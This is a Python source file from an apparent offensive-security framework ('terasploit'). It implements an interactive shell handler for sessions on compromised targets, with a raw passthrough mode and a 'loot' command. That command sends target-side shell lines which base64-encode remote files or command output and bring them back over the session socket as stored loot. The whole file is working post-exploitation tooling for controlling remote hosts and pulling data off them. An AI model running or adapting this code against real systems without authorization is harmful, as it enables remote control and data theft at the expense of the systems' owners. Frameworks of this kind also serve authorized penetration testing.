import base64
import contextlib
import dataclasses
import os
import select
import shlex
import sqlite3
import sys
import termios
import time
from collections import deque
from dataclasses import field
from typing import Any

from terasploit.ui.printf import (
    error,
    info,
    print_line,
    warning,
)
from terasploit.ui.record import recorder


# Standard network buffer size - bytes read per recv() call.
RECV_CHUNK = 4096

# Seconds to wait for the transfer sentinel before giving up.
TRANSFER_TIMEOUT = 60.0


@dataclasses.dataclass
class TransferState:
    """Contains the transfer state for Base Shell."""

    mode: bool = False
    file: Any | None = None
    buffer: bytearray = field(default_factory=bytearray)

    # Flags to know where is the start/end of bytes
    start_terminator: bytes = b"---TERASPLOIT_SHELL_SOF---"
    terminator: bytes = b"---TERASPLOIT_SHELL_EOF---"

    # Deadline (monotonic seconds) set when a transfer begins.
    deadline: float = 0.0

    artifact_name: str | None = None
    artifact_metadata: dict = field(default_factory=dict)


class BaseShell:
    """High-performance multiplexed I/O loop for an interactive shell session."""

    PLATFORM_LABEL: str = "Generic"

    def __init__(self, session, session_registry_fn=None, loot_manager=None):
        self._session = session
        self._registry_fn = session_registry_fn or (lambda: {})
        self._loot_manager = loot_manager

        self._running = False
        self._raw_mode = False  # True → bypass command interception, send everything verbatim

        self._sock = session.transport.sock
        self._transfer_state = TransferState()

        # Raw-stdin state: populated by _enter_raw_stdin(), cleared by _restore_raw_stdin().
        self._orig_termios: list | None = None
        # Accumulates characters the user has typed but not yet submitted.
        self._input_buffer: list[str] = []

        try:
            self.was_blocking = self._sock.getblocking()
        except OSError, AttributeError:
            # paramiko.Channel has no getblocking() and starts in blocking
            # mode by default, so True is the correct fallback for it too.
            self.was_blocking = True

        self._pending_echo: deque[bytes] = deque()
        self._echo_buffer = bytearray()

    def _enter_raw_stdin(self) -> bool:
        """Switch stdin to raw (unbuffered, no-echo) mode."""
        try:
            fd = sys.stdin.fileno()
            self._orig_termios = termios.tcgetattr(fd)

            new = termios.tcgetattr(fd)

            # Input: disable break→interrupt, CR→NL, parity check,
            # 8th-bit strip, and software flow control.
            new[0] &= ~(termios.BRKINT | termios.ICRNL | termios.INPCK | termios.ISTRIP | termios.IXON)

            # Output (index 1 / OFLAG): intentionally not modified.
            # OPOST must stay on so \n is translated to \r\n for all
            # framework output that we do not control.

            # Control: 8-bit clean, no parity.
            new[2] &= ~(termios.CSIZE | termios.PARENB)
            new[2] |= termios.CS8

            # Local: disable canonical buffering, echo, extended input,
            # and signal-generating keys (Ctrl-C etc. come as raw bytes).
            new[3] &= ~(termios.ECHO | termios.ICANON | termios.IEXTEN | termios.ISIG)

            # Read one byte at a time, no inter-character timeout.
            new[6][termios.VMIN] = 1
            new[6][termios.VTIME] = 0

            termios.tcsetattr(fd, termios.TCSADRAIN, new)
            return True
        except termios.error, OSError:
            # stdin is not a real TTY (e.g. piped input in tests).
            self._orig_termios = None
            return False

    def _restore_raw_stdin(self) -> None:
        """Restore the terminal to its original cooked mode."""
        if self._orig_termios is None:
            return
        try:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, self._orig_termios)
        except termios.error, OSError:
            pass
        finally:
            self._orig_termios = None

    def _prompt_noop(self) -> str:
        """Return a platform-appropriate no-op that forces the remote to reprint its prompt."""
        return ""

    def interact(self):
        """Start the interactive I/O loop."""
        if not self._session.runtime.alive or self._sock.fileno() == -1:
            error(f"Cannot interact with Session {self._session.session_id}: Socket is closed.")
            return

        info(
            f"Session {self._session.session_id} opened "
            f"({self.PLATFORM_LABEL})"
            f" -> target {self._session.transport.addr[0]}:{self._session.transport.addr[1]}"
        )
        info("Type 'help' for available commands. Use 'background' to detach.\n")
        try:
            self._sock.setblocking(False)
            self._running = True
            self._enter_raw_stdin()
            self._run_loop()
        except OSError as exc:
            if exc.errno == 9:
                error("Session closed by remote host (Bad file descriptor).")
            else:
                error(f"Failed to initialize shell interaction: {exc}")
            self._session.runtime.alive = False
        finally:
            self._restore_raw_stdin()
            self._stop_transfer()
            self.cleanup_socket_state()

    def cleanup_socket_state(self):
        """Restore the socket to its original blocking mode."""
        try:
            if self._sock.fileno() != -1:
                self._sock.setblocking(self.was_blocking)
        except OSError:
            self._session.runtime.alive = False

    def _run_loop(self):
        """Inner select loop — extracted so interact() can wrap it in try/finally."""
        while self._running and self._session.runtime.alive:
            try:
                if self._sock.fileno() == -1:
                    break
                # Transfer timeout guard — abort a stuck transfer.
                if self._transfer_state.mode and self._transfer_state.deadline > 0 and time.monotonic() > self._transfer_state.deadline:
                    error(f"Transfer timed out after {TRANSFER_TIMEOUT}s — sentinel never received. Aborting.")
                    self._stop_transfer()

                self._poll_io([self._sock, sys.stdin])
            except KeyboardInterrupt, EOFError:
                if self._transfer_state.mode:
                    self._stop_transfer()
                print_line()
                continue
            except (OSError, ValueError) as exc:
                error(f"Session monitoring error: {exc}")
                self._session.runtime.alive = False
                break

    def _poll_io(self, watch):
        """Poll remote socket and standard input for available data."""
        readable, _, _ = select.select(watch, [], [], 0.5)

        handlers = {
            self._sock: self._handle_remote_read,
            sys.stdin: self._handle_stdin_read,
        }

        for source in readable:
            handlers[source]()

    def _filter_command_echo(self, data: bytes) -> bytes:
        """Remove locally submitted commands echoed by the remote shell."""
        pending = self._pending_echo
        buffer = self._echo_buffer

        output = bytearray()
        buffer.extend(data)
        while (newline := buffer.find(b"\n")) != -1:
            line = bytes(buffer[: newline + 1])
            del buffer[: newline + 1]

            command = line[:-1].removesuffix(b"\r")

            if pending and command == pending[0]:
                pending.popleft()
                continue

            output.extend(line)

        if buffer:
            if pending:
                candidate = bytes(buffer).removesuffix(b"\r")

                if not pending[0].startswith(candidate):
                    output.extend(buffer)
                    buffer.clear()
            else:
                output.extend(buffer)
                buffer.clear()

        return bytes(output)

    def _handle_remote_read(self):
        """Read available data from the socket and dispatch."""
        try:
            data = self._sock.recv(RECV_CHUNK)
        except TimeoutError, BlockingIOError:
            return
        if not data:
            self._session.runtime.alive = False
            return
        if self._transfer_state.mode:
            self._accumulate_transfer(data)
            return

        data = self._filter_command_echo(data)
        if data:
            self._write_remote_output(data)

    def _write_remote_output(self, data: bytes) -> None:
        """Write remote output to the local terminal."""
        text = data.decode("utf-8", errors="replace")
        if self._orig_termios is not None and self._input_buffer:
            # Erase the user's partially-typed line, write remote output,
            # then redraw what the user had typed so far.
            sys.stdout.write("\r\x1b[2K")
            sys.stdout.write(text)
            sys.stdout.write("".join(self._input_buffer))
        else:
            sys.stdout.write(text)

        sys.stdout.flush()

    def _handle_stdin_read(self):
        """Read and dispatch user input (raw char-at-a-time or cooked line)."""
        if self._orig_termios is not None:
            self._handle_raw_stdin_char()
        else:
            self._handle_cooked_stdin_line()

    def _handle_raw_stdin_char(self) -> None:
        """Read one byte from stdin and update the local input buffer."""
        try:
            ch = os.read(sys.stdin.fileno(), 1)
        except OSError:
            self._running = False
            return
        if not ch:
            self._running = False
            return

        byte = ch[0]
        # Ctrl-C — abort active transfer or print a blank line.
        if byte == 0x03:
            if self._transfer_state.mode:
                self._stop_transfer()

            sys.stdout.write("\r\n")
            sys.stdout.flush()

            return
        # Ctrl-D — signal EOF / exit.
        if byte == 0x04:
            self._running = False
            return
        # Enter (CR or LF) — submit buffered line.
        if byte in (0x0D, 0x0A):
            line = "".join(self._input_buffer)
            self._input_buffer.clear()

            sys.stdout.write("\r\n")
            sys.stdout.flush()
            recorder.write_input(line + "\n")

            self._handle_user_input(line.strip())
            return
        # Backspace (DEL 0x7F or BS 0x08).
        if byte in (0x7F, 0x08):
            if self._input_buffer:
                self._input_buffer.pop()

                sys.stdout.write("\b \b")
                sys.stdout.flush()

            return
        # Printable ASCII — echo and buffer.
        if 0x20 <= byte < 0x7F:
            char = ch.decode("latin-1")
            self._input_buffer.append(char)
            sys.stdout.write(char)
            sys.stdout.flush()

    def _handle_cooked_stdin_line(self) -> None:
        """Fallback: read a full line from stdin via the kernel line discipline."""
        user_input = sys.stdin.readline()
        if not user_input:
            self._running = False
            return
        recorder.write_input(user_input)
        self._handle_user_input(user_input.strip())

    def _accumulate_transfer(self, data):
        """Accumulate incoming data until the transfer terminator is received."""
        state = self._transfer_state
        state.buffer.extend(data)
        if state.terminator not in state.buffer:
            return
        try:
            encoded_content = self._extract_transfer_payload()
            binary_content = self._decode_transfer_payload(encoded_content)
            self._store_transfer_result(binary_content)
        except (
            ValueError,
            OSError,
            RuntimeError,
            TypeError,
            sqlite3.Error,
        ) as exc:
            error(f"Data transfer failed: {exc}")
        finally:
            self._stop_transfer()
            # We send a noop to restore the remote prompt
            self._send(self._prompt_noop())

    def _extract_transfer_payload(self):
        """Extract the encoded payload from the framed transfer buffer."""
        state = self._transfer_state
        transfer_data, _ = state.buffer.split(state.terminator, 1)

        start = transfer_data.find(state.start_terminator)
        if start == -1:
            raise ValueError("Transfer start marker was not received.")

        return bytes(transfer_data[start + len(state.start_terminator) :])

    def _decode_transfer_payload(self, encoded_content):
        """Decode the transfer response and validate its status."""
        lines = encoded_content.strip().splitlines()
        if lines and lines[0] in {b"OK", b"ERR"}:
            status, *payload = lines
            encoded_content = b"".join(payload)
            if status == b"ERR":
                detail = base64.b64decode(encoded_content).decode(
                    "utf-8",
                    errors="replace",
                )
                raise RuntimeError(f"Remote file read failed: {detail}")
        else:
            encoded_content = b"".join(encoded_content.split())

        return base64.b64decode(encoded_content, validate=True)

    def _store_transfer_result(self, binary_content):
        """Write transferred data to its destination."""
        state = self._transfer_state
        if state.file is not None:
            state.file.write(binary_content)
        if state.artifact_name is not None:
            self._store_transfer_loot(binary_content)
            return

        info(f"Transfer complete. Verified {len(binary_content)} bytes.")

    def _store_transfer_loot(self, binary_content):
        """Register transferred data in Loot Manager."""
        if self._loot_manager is None:
            raise RuntimeError("Loot storage is unavailable in this session.")

        state = self._transfer_state
        record = self._loot_manager.store_bytes(
            binary_content,
            state.artifact_name,
            **state.artifact_metadata,
        )
        info(f"Loot stored as record {record['id']}: {record['filename']} ({len(binary_content)} bytes).")

    def _start_transfer(
        self,
        local_path=None,
        *,
        artifact_name=None,
        artifact_metadata=None,
        timeout: float = TRANSFER_TIMEOUT,
    ):
        """Prepare a local-file or managed-loot transfer."""
        if self._transfer_state.mode:
            warning("A file transfer is already in progress.")
            return False
        try:
            if local_path is not None:
                # By design, it is generally better to keep the file open when waiting for bytes in socket
                self._transfer_state.file = open(local_path, "wb")  # noqa: SIM115

            self._transfer_state.buffer = bytearray()
            self._transfer_state.artifact_name = artifact_name
            self._transfer_state.artifact_metadata = dict(artifact_metadata or {})

            self._transfer_state.mode = True
            self._transfer_state.deadline = time.monotonic() + timeout

            return True
        except OSError as exc:
            error(f"Local file error: {exc}")
            return False

    def _stop_transfer(self):
        """Close the transfer file handle and reset transfer state."""
        if self._transfer_state.file is not None:
            with contextlib.suppress(OSError):
                self._transfer_state.file.close()
            self._transfer_state.file = None

        self._transfer_state.mode = False
        self._transfer_state.buffer = bytearray()
        self._transfer_state.deadline = 0.0
        self._transfer_state.artifact_name = None
        self._transfer_state.artifact_metadata = {}

    def _handle_user_input(self, raw):
        """Dispatch user input to a built-in command or the remote."""
        if not raw:
            # Bare Enter: tickle the remote to reprint its prompt.
            self._send(self._prompt_noop())
            return
        if self._raw_mode and raw != "clear":
            self._handle_raw_input(raw)
            return
        try:
            parts = self._parse_input(raw)
        except ValueError as exc:
            warning(f"Invalid command syntax: {exc}")
            self._send(self._prompt_noop())
            return

        command, *args = parts
        handlers = {
            "background": self.cmd_background,
            "bg": self.cmd_background,
            "exit": self.cmd_exit,
            "quit": self.cmd_exit,
            "sessions": self.cmd_sessions,
            "shell": self.cmd_shell,
            "clear": self.cmd_clear_terminal,
            "loot": lambda: self.cmd_loot(args),
            "help": self.cmd_help,
            "?": self.cmd_help,
        }

        handler = handlers.get(command.lower())
        if handler:
            handler()
            # Built-in consumed locally — tickle the remote to reprint its prompt.
            self._send(self._prompt_noop())
        else:
            # Remote command — target's response carries the next prompt naturally.
            self._send(raw)

    def _handle_raw_input(self, raw):
        """Handle input while raw passthrough mode is active."""
        if raw.strip().lower() == "exit_raw":
            self._raw_mode = False
            info("Exited raw shell mode.")
            self._send(self._prompt_noop())
            return

        self._send(raw)

    def _parse_input(self, raw):
        """Parse user input using platform-appropriate quoting rules."""
        if raw.split(None, 1)[0].lower() != "loot":
            return raw.split()

        parts = shlex.split(
            raw,
            posix=self.PLATFORM_LABEL.lower() != "windows",
        )
        if self.PLATFORM_LABEL.lower() == "windows":
            parts = [part[1:-1] if len(part) >= 2 and part[0] == part[-1] and part[0] in {"'", '"'} else part for part in parts]

        return parts

    def _send(self, text, *, track_echo=True):
        """Send text to the remote shell with a platform-appropriate newline."""
        if not self._session.runtime.alive:
            return False

        try:
            self._sock.setblocking(True)

            terminator = "\r\n" if self.PLATFORM_LABEL.lower().strip() == "windows" else "\n"
            cleaned = text.rstrip("\r\n")
            payload = (cleaned + terminator).encode("latin-1", errors="replace")

            self._sock.sendall(payload)

            if track_echo and cleaned:
                self._pending_echo.append(cleaned.encode("latin-1", errors="replace"))

            return True

        except OSError:
            self._session.runtime.alive = False
            return False

        finally:
            with contextlib.suppress(OSError):
                self._sock.setblocking(False)

    def cmd_background(self):
        """Detach the shell and return control to the framework console."""
        info(f"Backgrounding session {self._session.session_id}.")
        self._running = False

    def cmd_exit(self):
        """Close the session and exit the shell."""
        info(f"Closing session {self._session.session_id}.")
        self._sock.setblocking(self.was_blocking)
        self._session.close()

    def cmd_sessions(self):
        """List all active sessions."""
        sessions = self._registry_fn()
        print_line("\nActive Sessions:")
        for sid, sess in sessions.items():
            print_line(f"  {sid} -> {sess.transport.addr[0]}:{sess.transport.addr[1]}")
        print_line()

    def cmd_shell(self):
        """Enter raw passthrough mode — all input is forwarded verbatim."""
        self._raw_mode = True
        info("Entered raw shell mode. Type 'exit_raw' to return to normal mode.")

    def cmd_clear_terminal(self):
        """Clear the local terminal screen without forwarding to the remote."""
        sys.stdout.write("\x1b[2J\x1b[H")
        sys.stdout.flush()

    def cmd_loot(self, args):
        """Capture command output or collect an existing remote file as loot."""
        if args and args[0] in {"--remote", "-r"}:
            self._loot_remote_file(args[1:])
            return
        if len(args) < 2:
            warning("Usage: loot <local_file> <command...> | loot --remote <remote_path> [--name <filename>]")
            return

        local_path = args[0]
        artifact_name = local_path.replace("\\", "/").rsplit("/", 1)[-1]
        if not artifact_name:
            error("The local output path must include a filename.")
            return

        remote_cmd = " ".join(args[1:])
        if self._loot_manager is None:
            error("Loot storage is unavailable in this session.")
            return

        info(f"Capturing output of '{remote_cmd}' → {local_path} and loot/{artifact_name}")
        address = self._session.transport.addr[0]

        metadata = {
            "host": address,
            "session_id": self._session.session_id,
            "module": getattr(self._session, "module", None),
            "source": "session",
            "description": remote_cmd,
            "platform": self.PLATFORM_LABEL.lower(),
            "workspace": getattr(self._session, "workspace", None),
        }
        if not self._start_transfer(local_path, artifact_name=artifact_name, artifact_metadata=metadata):
            return

        # Wrap the command so its output is base64-encoded on the target,
        # then terminated with the sentinel — same mechanism as download.
        loot_cmd = self._build_loot_cmd(remote_cmd)
        if not self._send(loot_cmd, track_echo=False):
            self._stop_transfer()

        # We send a noop to restore the remote prompt
        self._send(self._prompt_noop())

    def _loot_remote_file(self, args):
        """Retrieve an existing remote file and register it in Loot Manager."""
        if not args:
            warning("Usage: loot --remote <remote_path> [--name <filename>]")
            return

        remote_path = args[0]
        artifact_name = remote_path.replace("\\", "/").rsplit("/", 1)[-1]
        if len(args) > 1:
            if len(args) != 3 or args[1] != "--name" or not args[2]:
                warning("Usage: loot --remote <remote_path> [--name <filename>]")
                return
            artifact_name = args[2]
        if self._loot_manager is None:
            error("Loot storage is unavailable in this session.")
            return
        if not artifact_name:
            error("Unable to determine the remote filename; specify --name.")
            return

        metadata = {
            "host": self._session.transport.addr[0],
            "session_id": self._session.session_id,
            "module": getattr(self._session, "module", None),
            "source": "remote_file",
            "description": f"Remote file: {remote_path}",
            "platform": self.PLATFORM_LABEL.lower(),
            "workspace": getattr(self._session, "workspace", None),
        }
        info(f"Collecting remote file '{remote_path}' → loot/{artifact_name}")
        if not self._start_transfer(artifact_name=artifact_name, artifact_metadata=metadata):
            return

        command = self._build_remote_file_cmd(remote_path)
        if not self._send(command, track_echo=False):
            self._stop_transfer()

        # We send a noop to restore the remote prompt
        self._send(self._prompt_noop())

    def _build_remote_file_cmd(self, remote_path):
        """Build a framed Base64 command that reads one remote file."""
        safe_path = shlex.quote(remote_path)
        error_text = "Remote file does not exist or is not readable."
        encoded_error = base64.b64encode(error_text.encode()).decode("ascii")
        return (
            "printf '%s\n' '---TERASPLOIT_SHELL_SOF---'; "
            f"if [ -f {safe_path} ] && [ -r {safe_path} ]; then "
            "printf '%s\n' 'OK'; "
            f"base64 {safe_path}; "
            "else printf '%s\n' 'ERR'; "
            f"printf '%s\n' '{encoded_error}'; fi; "
            "printf '%s\n' '---TERASPLOIT_SHELL_EOF---'"
        )

    def _build_loot_cmd(self, remote_cmd: str) -> str:
        """Build the target-side command that base64-encodes output and appends the sentinel."""
        safe_cmd = remote_cmd.replace("'", "'\\''")
        return f"printf '%s%s\\n' '---TERASPLOIT_' 'SHELL_SOF---'; ( {safe_cmd} ) 2>&1 | base64; printf '%s%s\\n' '---TERASPLOIT_' 'SHELL_EOF---'"

    def cmd_help(self):
        """Print available built-in commands. Subclasses supply sections."""
        self._print_help_sections(self._help_sections())

    def _help_sections(self) -> list:
        """Return the help content for this shell as a list of (title, entries) tuples."""
        return [
            (
                "Core",
                [
                    ("help / ?", "Show this help menu"),
                    ("background / bg", "Detach session and return to console"),
                    ("exit / quit", "Close this session permanently"),
                    ("sessions", "List all open sessions"),
                    ("shell", "Enter raw passthrough mode (no command interception)"),
                    ("clear", "Clear the local terminal screen"),
                    ("loot <file> <cmd>", "Save remote output locally and register it in loot"),
                    ("loot --remote <path>", "Collect an existing remote file into Loot Manager"),
                ],
            ),
            (
                "Execution",
                [
                    ("<any command>", "Execute command on the target"),
                ],
            ),
        ]

    @staticmethod
    def _print_help_sections(sections: list) -> None:
        """Render a list of (title, [(command, description), ...]) sections as a formatted help table."""
        print_line()
        for section, entries in sections:
            print_line(f"{section} commands\n")

            # Headers
            print_line("   " + f"{'Command':<30}" + " " + "Description")
            print_line("   " + f"{'-------':<30}" + " " + "-----------")

            # Commands and definitions
            for cmd, desc in entries:
                print_line("   " + f"{cmd:<30}" + " " + f"{desc}")

            # New line to seperate categories properly
            print_line("\n")
